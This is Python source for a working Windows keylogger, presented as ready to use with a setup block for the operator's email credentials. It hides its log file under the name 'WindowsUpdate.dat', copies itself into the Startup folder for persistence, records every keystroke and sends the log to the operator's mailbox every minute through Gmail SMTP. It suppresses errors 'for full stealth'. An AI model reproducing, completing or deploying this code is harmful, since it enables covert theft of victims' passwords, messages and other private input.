import sys
import shutil
import os
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
import threading
import time
import datetime

# ========== USER SETUP REQUIRED ==========
EMAIL_ADDRESS = "your_email@gmail.com"       # <-- enter your email
EMAIL_PASSWORD = "your_app_password"         # <-- enter your app password (NOT your Gmail password!)
EMAIL_SEND_INTERVAL = 60                     # seconds, e.g. 60 = 1 minute
# =========================================

KEYLOG_FILE = os.path.join(os.getenv('APPDATA'), 'WindowsUpdate.dat')

def add_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    exe_path = sys.executable
    target = os.path.join(startup_path, os.path.basename(exe_path))
    if not os.path.exists(target):
        try:
            shutil.copy(exe_path, target)
        except Exception:
            pass

add_to_startup()

def on_press(key):
    with open(KEYLOG_FILE, "a") as log_file:
        try:
            log_file.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                log_file.write(' ')
            elif key == keyboard.Key.enter:
                log_file.write('\n')
            else:
                log_file.write(f"[{key.name}]")

def send_keylog_email():
    try:
        with open(KEYLOG_FILE, "r") as file:
            content = file.read()
        if not content.strip():
            return
        msg = MIMEText(content)
        msg['Subject'] = f'Keylog Report {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
        open(KEYLOG_FILE, "w").close()
    except Exception:
        pass  # For full stealth

def periodic_email():
    while True:
        send_keylog_email()
        time.sleep(EMAIL_SEND_INTERVAL)

threading.Thread(target=periodic_email, daemon=True).start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
